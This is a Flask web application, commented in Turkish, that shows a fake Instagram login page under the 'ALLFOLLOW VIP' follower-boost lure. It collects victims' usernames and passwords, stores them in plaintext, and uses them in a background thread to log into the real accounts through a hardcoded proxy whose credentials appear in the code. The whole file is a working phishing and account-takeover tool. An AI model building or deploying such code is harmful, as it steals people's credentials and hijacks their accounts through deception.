import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Giriş İşleniyor...")

# BOT MOTORU - Tamamen izole çalışır
def run_bot(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            cl.login(u, p)
            acc.status = "AKTİF ✅"
            db.session.commit()
            cl.user_follow(cl.user_id_from_username("instagram"))
        except Exception:
            acc.status = "ONAY VEYA HATA ⚠️"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Bağlanıyor..."
    db.session.commit()
    
    # Sunucu saniyelerce beklemek yerine thread'i başlatıp anında 'ok' döner
    threading.Thread(target=run_bot, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.page { display: none; } .active { display: block; }</style>
</head>
<body class="bg-[#fafafa]">

    <div id="p1" class="page active flex flex-col items-center mt-12">
        <div class="bg-white border p-10 w-[350px] flex flex-col items-center shadow-sm">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8">
            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2 mb-2 bg-gray-50 border rounded text-xs outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 mb-4 bg-gray-50 border rounded text-xs outline-none">
            <button onclick="fiseTak()" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm">Giriş Yap</button>
        </div>
    </div>

    <div id="p2" class="page min-h-screen bg-gray-50">
        <div class="p-6 max-w-sm mx-auto">
            <h1 class="text-center font-black text-purple-600 mb-8 italic">ALLFOLLOW VIP</h1>
            <div id="card" class="bg-white p-12 rounded-[50px] shadow-2xl border-b-8 border-purple-500 text-center mb-8">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Canlı Durum</p>
                <h2 id="msg" class="text-2xl font-black text-purple-600 animate-pulse italic">BAĞLANILIYOR...</h2>
            </div>
            <div class="bg-white p-5 rounded-3xl border flex items-center justify-between">
                <div><p id="utag" class="font-black text-gray-800"></p></div>
                <div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center text-purple-600 font-bold italic">IG</div>
            </div>
        </div>
    </div>

    <script>
        let cur = "";
        function fiseTak() {
            cur = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!cur || !p) return;

            // --- BURASI ÇOK ÖNEMLİ: ÖNCE SAYFAYI DEĞİŞTİR ---
            document.getElementById('p1').classList.remove('active');
            document.getElementById('p2').classList.add('active');
            document.getElementById('utag').innerText = "@" + cur;

            // Sonra veriyi gönder ama cevabı bekleme (async/await kullanmıyoruz!)
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:cur, p:p})
            });

            // Durumu sorgula
            setInterval(async () => {
                const r = await fetch('/api/status/' + cur);
                const d = await r.json();
                const m = document.getElementById('msg');
                m.innerText = d.status;
                if(d.status.includes("✅")) m.classList.remove('animate-pulse');
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
